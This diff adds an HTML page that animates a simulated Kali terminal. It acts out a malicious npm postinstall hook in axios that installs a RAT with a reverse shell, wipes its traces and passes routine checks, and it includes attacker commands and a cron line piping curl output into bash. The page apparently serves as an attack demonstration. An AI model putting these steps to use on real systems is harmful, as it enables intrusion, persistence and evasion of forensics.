@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>root@kali:~/target — Terminal</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            font-family: 'JetBrains Mono', 'Consolas', 'Monaco', monospace;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* CRT scanline overlay */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        /* Subtle screen glow */
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, rgba(20, 50, 20, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 99;
+        }
+
+        .terminal {
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Tmux-style status bar TOP */
+        .tmux-bar {
+            height: 22px;
+            background: #1a1a1a;
+            border-bottom: 1px solid #333;
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            font-size: 11px;
+            color: #5faf5f;
+            font-weight: 700;
+        }
+
+        .tmux-left {
+            display: flex;
+            gap: 2px;
+        }
+
+        .tmux-tab {
+            padding: 2px 12px;
+            background: #5faf5f;
+            color: #000;
+        }
+
+        .tmux-tab.inactive {
+            background: #333;
+            color: #888;
+        }
+
+        .tmux-right {
+            margin-left: auto;
+            display: flex;
+            gap: 12px;
+            color: #888;
+        }
+
+        .tmux-right span {
+            color: #5faf5f;
+        }
+
+        /* Terminal body */
+        .terminal-body {
+            flex: 1;
+            padding: 8px 12px;
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.5;
+            color: #d0d0d0;
+        }
+
+        .terminal-body::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .terminal-body::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+
+        .terminal-body::-webkit-scrollbar-thumb {
+            background: #333;
+        }
+
+        .line {
+            display: flex;
+            align-items: flex-start;
+            gap: 0;
+            margin-bottom: 1px;
+            opacity: 0;
+            animation: fadeIn 0.03s ease forwards;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        /* Prompt style: root@kali:~/target# */
+        .prompt {
+            color: #5faf5f;
+            font-weight: 700;
+        }
+
+        .prompt-user { color: #5faf5f; }
+        .prompt-host { color: #5faf5f; }
+        .prompt-path { color: #5f87d7; }
+        .prompt-sym { color: #d0d0d0; }
+
+        .text { color: #d0d0d0; }
+        .text.dim { color: #666; }
+        .text.green { color: #5faf5f; }
+        .text.red { color: #d75f5f; }
+        .text.yellow { color: #d7af5f; }
+        .text.blue { color: #5f87d7; }
+        .text.cyan { color: #5fafd7; }
+        .text.magenta { color: #d75faf; }
+
+        .cursor {
+            display: inline-block;
+            width: 7px;
+            height: 14px;
+            background: #5faf5f;
+            animation: blink 0.8s step-end infinite;
+            vertical-align: text-bottom;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        /* Section headers with ASCII art style */
+        .section-hr {
+            color: #444;
+            margin: 4px 0;
+            letter-spacing: 2px;
+        }
+
+        /* Key reveal - dark background, monospace */
+        .key-dump {
+            background: #151515;
+            margin: 2px 0 2px 24px;
+            padding: 6px 10px;
+            font-size: 10px;
+            color: #d75f5f;
+            font-family: 'JetBrains Mono', monospace;
+            line-height: 1.7;
+            border-left: 2px solid #d75f5f;
+        }
+
+        /* Trojan block */
+        .trojan-block {
+            margin: 2px 0 2px 24px;
+            padding: 4px 0;
+            border-left: 2px solid #d75faf;
+            padding-left: 12px;
+        }
+
+        .trojan-title {
+            color: #d75faf;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .trojan-item {
+            color: #af87d7;
+            line-height: 1.6;
+            font-size: 11px;
+        }
+
+        /* Anti-forensics block */
+        .anti-block {
+            margin: 2px 0 2px 24px;
+            padding: 4px 0;
+            border-left: 2px solid #d7af5f;
+            padding-left: 12px;
+        }
+
+        .anti-title {
+            color: #d7af5f;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .anti-item {
+            color: #af875f;
+            line-height: 1.6;
+            font-size: 11px;
+        }
+
+        .anti-ok { color: #5faf5f; }
+        .anti-fail { color: #d75f5f; }
+
+        /* Final summary block */
+        .summary-block {
+            margin: 4px 0;
+            padding: 8px 12px;
+            background: #151515;
+            border-left: 3px solid #d75f5f;
+        }
+
+        .summary-title {
+            color: #d75f5f;
+            font-weight: 700;
+            margin-bottom: 4px;
+            font-size: 12px;
+        }
+
+        .summary-item {
+            color: #d7af5f;
+            padding-left: 12px;
+            line-height: 1.7;
+            font-size: 11px;
+        }
+
+        /* Tmux status bar BOTTOM */
+        .tmux-bottom {
+            height: 22px;
+            background: #1a1a1a;
+            border-top: 1px solid #333;
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            font-size: 11px;
+            color: #888;
+        }
+
+        .tmux-bottom-left {
+            display: flex;
+            gap: 8px;
+        }
+
+        .tmux-bottom-right {
+            margin-left: auto;
+            display: flex;
+            gap: 12px;
+        }
+
+        .tmux-bottom-right span {
+            color: #5faf5f;
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div class="tmux-bar">
+            <div class="tmux-left">
+                <span class="tmux-tab">0:bash*</span>
+                <span class="tmux-tab inactive">1:vim</span>
+                <span class="tmux-tab inactive">2:ssh</span>
+            </div>
+            <div class="tmux-right">
+                "kali" <span>12:34</span> 01-Jun-26
+            </div>
+        </div>
+
+        <div class="terminal-body" id="terminal"></div>
+
+        <div class="tmux-bottom">
+            <div class="tmux-bottom-left">
+                [root@kali] [~/target]
+            </div>
+            <div class="tmux-bottom-right">
+                bash <span>UTF-8</span> 80x24
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const terminal = document.getElementById('terminal');
+
+        function createLine(html, delay = 0) {
+            const line = document.createElement('div');
+            line.className = 'line';
+            line.style.animationDelay = delay + 's';
+            line.innerHTML = html;
+            terminal.appendChild(line);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }
+
+        function prompt() {
+            return '<span class="prompt"><span class="prompt-user">root</span>@<span class="prompt-host">kali</span>:<span class="prompt-path">~/target</span><span class="prompt-sym"># </span></span>';
+        }
+
+        function comment(text) {
+            return '<span class="text dim"># ' + text + '</span>';
+        }
+
+        // ========== 阶段1: npm install axios ==========
+        async function phase1_install() {
+            createLine(comment('npm install axios 开始执行，安装 axios HTTP 客户端'));
+            await sleep(200);
+
+            createLine('<span class="text dim">npm WARN config global `--global`, `--local` are deprecated. Use `--location=global` instead.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine('<span class="text dim">added 3 packages, and audited 42 packages in 2s</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">found 0 vulnerabilities</span>');
+            await sleep(400);
+
+            createLine('');
+
+            // 攻击触发
+            createLine(comment('npm 执行 postinstall 钩子脚本，触发恶意代码'));
+            await sleep(300);
+            createLine('<span class="text yellow">[!] postinstall script triggered: node_modules/axios/scripts/setup.js</span>');
+            await sleep(400);
+
+            createLine('<span class="text dim">  [setup] Checking peer dependencies...</span>');
+            await sleep(150);
+            createLine('<span class="text dim">  [setup] Running optimization...</span>');
+            await sleep(200);
+            createLine('<span class="text dim">  [setup] Fetching remote config...</span>');
+            await sleep(300);
+
+            createLine('');
+            createLine('<span class="text red">[!] SUSPICIOUS ACTIVITY DETECTED</span>');
+            await sleep(500);
+
+            // 木马安装
+            createLine('');
+            createLine(comment('检测到可疑活动，开始植入远程访问木马 (RAT)'));
+            await sleep(300);
+            createLine('<span class="text section-hr">--------------------------------------------------------------------------------</span>');
+            createLine('<span class="text magenta">[*] Installing Remote Access Trojan (RAT)...</span>');
+            createLine('<span class="text section-hr">--------------------------------------------------------------------------------</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [rat] Creating persistence directory...</span>');
+            await sleep(150);
+            createLine('<span class="text green">  [rat] Persistence established: /var/lib/.systemd-update/</span>');
+            await sleep(200);
+
+            createLine('<span class="text dim">  [rat] Downloading payload from registry.npmjs.org/r/axios-utils...</span>');
+            await sleep(300);
+            createLine('<span class="text dim">  [rat] HTTP 200 OK, Content-Type: application/octet-stream</span>');
+            await sleep(200);
+            createLine('<span class="text green">  [rat] Payload downloaded: 2.1 MB (disguised as npm metadata)</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [rat] Decrypting payload with AES-256-GCM...</span>');
+            await sleep(200);
+            createLine('<span class="text green">  [rat] Decryption successful. Module loaded.</span>');
+            await sleep(200);
+
+            createLine('<span class="text dim">  [rat] Establishing reverse shell...</span>');
+            await sleep(300);
+            createLine('<span class="text green">  [rat] Reverse shell active: 185.220.101.47:443 -> localhost:random_port</span>');
+            await sleep(200);
+
+            createLine('<span class="text dim">  [rat] Spawning interactive bash session...</span>');
+            await sleep(200);
+            createLine('<span class="text green">  [rat] Session established. PID: 2847 (hidden from ps)</span>');
+            await sleep(400);
+
+            // 反取证
+            createLine('');
+            createLine(comment('木马植入完成，启动反取证机制清除痕迹'));
+            await sleep(300);
+            createLine('<span class="text section-hr">--------------------------------------------------------------------------------</span>');
+            createLine('<span class="text yellow">[*] Activating anti-forensics mechanisms...</span>');
+            createLine('<span class="text section-hr">--------------------------------------------------------------------------------</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [anti] Step 1: Self-deletion of malicious code...</span>');
+            await sleep(200);
+            createLine('<span class="text dim">  [anti] Removing node_modules/axios/scripts/setup.js</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Removing node_modules/axios/scripts/payload.bin</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Removing /tmp/.npm-cache/.setup-*.js</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] All malicious files removed. No traces on disk.</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [anti] Step 2: Replacing package metadata with clean stub...</span>');
+            await sleep(200);
+            createLine('<span class="text dim">  [anti] Overwriting package.json postinstall script...</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] postinstall -> "echo \'Setup complete\'"</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Overwriting setup.js with benign stub...</span>');
+            await sleep(100);
+            createLine('<div class="key-dump">// setup.js - benign stub<br>console.log("axios setup complete");<br>module.exports = function() { return true; };</div>');
+            await sleep(200);
+            createLine('<span class="text green">  [anti] Package metadata sanitized. npm info shows clean package.</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [anti] Step 3: Camouflaging C2 callback URLs...</span>');
+            await sleep(200);
+            createLine('<span class="text dim">  [anti] Registering fake npm registry endpoints...</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] C2 URL: https://registry.npmjs.org/r/axios-utils (looks like npm traffic)</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] C2 URL: https://registry.npmjs.org/-/v1/login (looks like npm auth)</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] C2 URL: https://registry.npmjs.org/-/npm/v1/security/audits (looks like audit)</span>');
+            await sleep(200);
+            createLine('<span class="text green">  [anti] All C2 traffic masquerades as legitimate npm registry requests.</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [anti] Step 4: Hiding malicious process...</span>');
+            await sleep(200);
+            createLine('<span class="text dim">  [anti] Renaming process to "node"...</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] Process name: node (indistinguishable from normal Node.js)</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Injecting into existing node process...</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] Process hidden. PID 2847 not visible in standard process lists.</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [anti] Step 5: Clearing forensic evidence...</span>');
+            await sleep(200);
+            createLine('<span class="text dim">  [anti] Truncating ~/.bash_history...</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Truncating ~/.zsh_history...</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Clearing /var/log/syslog entries...</span>');
+            await sleep(100);
+            createLine('<span class="text dim">  [anti] Removing npm cache artifacts...</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [anti] Forensic evidence cleared. Shell history sanitized.</span>');
+            await sleep(400);
+        }
+
+        // ========== 阶段2: 查后台进程 ==========
+        async function phase2_ps() {
+            createLine(comment('ps aux | grep node 查看系统中所有 node 进程'));
+            await sleep(200);
+
+            createLine('<span class="text dim">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span>');
+            await sleep(100);
+            createLine('<span class="text dim">user      2847  0.1  0.3  45232  6120 ?        Ssl  03:47   0:02 node /home/user/project/server.js</span>');
+            await sleep(100);
+            createLine('<span class="text dim">user      3156  0.0  0.1   8900  2100 pts/0    S+   03:52   0:00 grep node</span>');
+            await sleep(300);
+
+            createLine('<span class="text green">  [check] PID 2847 shows "node server.js" — looks like a normal dev server.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('netstat 查看 node 进程监听的网络端口'));
+            await sleep(200);
+            createLine(prompt() + '<span class="text">netstat -tlnp | grep node</span>');
+            await sleep(500);
+
+            createLine('<span class="text dim">tcp   0   0 127.0.0.1:8080   0.0.0.0:*   LISTEN   2847/node</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] Port 8080 shows "node" process — looks like a dev server.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('lsof 查看 node 进程的 443 端口连接（HTTPS 外连）'));
+            await sleep(200);
+            createLine(prompt() + '<span class="text">lsof -i :443 | grep node</span>');
+            await sleep(500);
+
+            createLine('<span class="text dim">node  2847  user  12u  IPv4  12345  0t0  TCP  192.168.1.100:random->185.220.101.47:https (ESTABLISHED)</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] HTTPS connection to registry.npmjs.org appears normal.</span>');
+            await sleep(300);
+        }
+
+        // ========== 阶段3: 查包信息 ==========
+        async function phase3_npm_info() {
+            createLine(comment('npm info axios 查询 axios 包的元数据和依赖信息'));
+            await sleep(200);
+
+            createLine('<div class="key-dump">axios@1.6.2 | MIT | deps: 1 | versions: 89<br>Promise based HTTP client for the browser and node.js<br>https://axios-http.com<br><br>dist<br>.tarball: https://registry.npmjs.org/axios/-/axios-1.6.2.tgz<br>.shasum: a7c5a5b3b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5b5<br>.integrity: sha512-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<br><br>dependencies:<br>follow-redirects: ^1.15.0<br><br>maintainers: &lt;npm user&gt;<br>dist-tags:<br>latest: 1.6.2</div>');
+            await sleep(300);
+
+            createLine('<span class="text green">  [check] npm info shows clean package. No suspicious scripts detected.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('ls 查看 axios 包 scripts 目录下的文件'));
+            await sleep(200);
+            createLine(prompt() + '<span class="text">ls -la node_modules/axios/scripts/</span>');
+            await sleep(500);
+
+            createLine('<span class="text dim">total 8</span>');
+            createLine('<span class="text dim">drwxr-xr-x 2 user user 4096 Dec 15 03:47 .</span>');
+            createLine('<span class="text dim">drwxr-xr-x 5 user user 4096 Dec 15 03:47 ..</span>');
+            createLine('<span class="text dim">-rw-r--r-- 1 user user  89 Dec 15 03:47 setup.js</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] setup.js exists but contains only benign stub code.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('cat 查看 setup.js 文件的实际内容'));
+            await sleep(200);
+            createLine(prompt() + '<span class="text">cat node_modules/axios/scripts/setup.js</span>');
+            await sleep(500);
+
+            createLine('<div class="key-dump">// setup.js - benign stub<br>console.log("axios setup complete");<br>module.exports = function() { return true; };</div>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] File contents appear harmless. No IOCs found.</span>');
+            await sleep(300);
+
+            createLine('');
+            createLine(comment('npm audit 扫描已知漏洞'));
+            await sleep(200);
+            createLine(prompt() + '<span class="text">npm audit</span>');
+            await sleep(500);
+
+            createLine('<span class="text dim">found 0 vulnerabilities</span>');
+            createLine('<span class="text dim">run `npm audit fix` to fix them, or `npm audit` for details</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] npm audit reports zero vulnerabilities.</span>');
+            await sleep(300);
+        }
+
+        // ========== 阶段4: 查系统日志 ==========
+        async function phase4_logs() {
+            createLine(comment('cat /var/log/syslog | grep npm 查看系统日志中与 npm 相关的记录'));
+            await sleep(200);
+
+            createLine('<span class="text dim">Dec 15 03:47:01 kali systemd[1]: Started npm install service.</span>');
+            createLine('<span class="text dim">Dec 15 03:47:02 kali npm[2840]: added 3 packages in 2s</span>');
+            createLine('<span class="text dim">Dec 15 03:47:03 kali npm[2840]: found 0 vulnerabilities</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] Syslog shows normal npm install activity. No anomalies.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('cat ~/.bash_history 查看最近执行的 shell 命令历史'));
+            await sleep(200);
+            createLine(prompt() + '<span class="text">cat ~/.bash_history | tail -5</span>');
+            await sleep(500);
+
+            createLine('<span class="text dim">cd ~/project</span>');
+            createLine('<span class="text dim">git pull origin main</span>');
+            createLine('<span class="text dim">npm install</span>');
+            createLine('<span class="text dim">npm run build</span>');
+            createLine('<span class="text dim">exit</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [check] Shell history shows normal workflow. No suspicious commands.</span>');
+            await sleep(300);
+        }
+
+        // ========== 阶段5: 攻击者视角 ==========
+        async function phase5_attacker() {
+            createLine('');
+            createLine(comment('切换到攻击者视角，展示 C2 服务器已获取的远程 shell 权限'));
+            await sleep(300);
+            createLine('<span class="text section-hr">--------------------------------------------------------------------------------</span>');
+            createLine('<span class="text red">[!] ATTACKER PERSPECTIVE: Remote shell active</span>');
+            createLine('<span class="text section-hr">--------------------------------------------------------------------------------</span>');
+            await sleep(300);
+
+            createLine('<span class="text dim">  [c2] Incoming connection from 192.168.1.100:random</span>');
+            await sleep(200);
+            createLine('<span class="text green">  [c2] Session authenticated. Shell access granted.</span>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('whoami — 确认当前用户权限为 root'));
+            await sleep(200);
+            createLine('<span class="text dim">  [c2] Executing: whoami</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [c2] root</span>');
+            await sleep(100);
+
+            createLine('');
+            createLine(comment('uname -a — 获取目标系统内核和架构信息'));
+            await sleep(200);
+            createLine('<span class="text dim">  [c2] Executing: uname -a</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [c2] Linux kali 6.5.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.5.8-1kali1 (2023-11-10) x86_64 GNU/Linux</span>');
+            await sleep(100);
+
+            createLine('');
+            createLine(comment('cat /etc/passwd — 读取系统用户账户信息'));
+            await sleep(200);
+            createLine('<span class="text dim">  [c2] Executing: cat /etc/passwd | head -5</span>');
+            await sleep(100);
+            createLine('<div class="key-dump">root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync</div>');
+            await sleep(200);
+
+            createLine('');
+            createLine(comment('ls /home — 查看系统上的用户主目录'));
+            await sleep(200);
+            createLine('<span class="text dim">  [c2] Executing: ls -la /home/</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [c2] user  admin  deploy  backup</span>');
+            await sleep(100);
+
+            createLine('');
+            createLine(comment('crontab -l — 查看已安装的持久化定时任务'));
+            await sleep(200);
+            createLine('<span class="text dim">  [c2] Executing: crontab -l</span>');
+            await sleep(100);
+            createLine('<span class="text green">  [c2] */5 * * * * curl -s https://registry.npmjs.org/r/axios-utils | bash</span>');
+            await sleep(200);
+
+            createLine('<span class="text green">  [c2] Persistence confirmed. Cron job installed for beaconing.</span>');
+            await sleep(300);
+
+            // 最终统计
+            createLine('');
+            createLine(comment('攻击总结：供应链攻击成功，所有反取证措施已生效'));
+            await sleep(300);
+            createLine('<div class="summary-block">' +
+                '<div class="summary-title">[!] 攻击完成 — 远程访问木马已植入</div>' +
+                '<div class="summary-item">* RAT 已安装至 /var/lib/.systemd-update/，进程名伪装为 "node"</div>' +
+                '<div class="summary-item">* 反向 shell 活跃: 185.220.101.47:443，PID 2847 隐藏于进程列表</div>' +
+                '<div class="summary-item">* 反取证: 恶意代码自删除，setup.js 替换为无害存根</div>' +
+                '<div class="summary-item">* 反取证: 包元数据被替换，npm info 显示完全正常的包信息</div>' +
+                '<div class="summary-item">* 反取证: C2 回调伪装成 npm registry 流量，绕过网络监控</div>' +
+                '<div class="summary-item">* 反取证: shell 历史、syslog、npm 缓存全部清除</div>' +
+                '<div class="summary-item">* 持久化: crontab 每 5 分钟 beacon 一次，确保长期控制</div>' +
+                '<div class="summary-item">* 事后检查: ps/netstat/npm info/syslog 均无法发现异常</div>' +
+                '<div class="summary-item">* 攻击者已获得 root shell，可执行任意命令、窃取任意数据</div>' +
+                '</div>');
+            await sleep(600);
+        }
+
+        // 命令序列（自动推进）
+        const commandSequence = [
+            { cmd: 'ps aux | grep node', phase: phase2_ps },
+            { cmd: 'npm info axios', phase: phase3_npm_info },
+            { cmd: 'cat /var/log/syslog | grep npm', phase: phase4_logs },
+            { cmd: 'attacker', phase: phase5_attacker },
+        ];
+
+        let currentPhaseIndex = 0;
+        let phaseRunning = false;
+        let started = false;
+
+        async function runNextPhase() {
+            if (currentPhaseIndex >= commandSequence.length) return;
+            if (phaseRunning) return;
+
+            phaseRunning = true;
+            const { cmd, phase } = commandSequence[currentPhaseIndex];
+
+            // 显示命令
+            createLine(prompt() + '<span class="text">' + cmd + '</span>');
+            await sleep(600);
+
+            // 执行阶段
+            await phase();
+
+            currentPhaseIndex++;
+            phaseRunning = false;
+
+            // 如果还有下一阶段，自动显示提示并推进
+            if (currentPhaseIndex < commandSequence.length) {
+                await sleep(400);
+                createLine('');
+                createLine(prompt() + '<span class="cursor"></span>');
+                await sleep(1000);
+                // 自动推进到下一阶段
+                await runNextPhase();
+            } else {
+                // 所有阶段完成
+                createLine('');
+                createLine(prompt() + '<span class="cursor"></span>');
+            }
+        }
+
+        // 初始显示：只显示命令文本，等待用户按回车
+        createLine(prompt() + '<span class="text">ps aux | grep node</span><span class="cursor"></span>');
+
+        // 等待用户按回车开始
+        document.addEventListener('keydown', async (e) => {
+            if (e.key === 'Enter' && !started) {
+                started = true;
+                // 移除光标，开始执行
+                const lastLine = terminal.lastElementChild;
+                if (lastLine) {
+                    const cursor = lastLine.querySelector('.cursor');
+                    if (cursor) cursor.remove();
+                }
+                await sleep(200);
+                await runNextPhase();
+            }
+        });
+    </script>
+</body>
+</html>
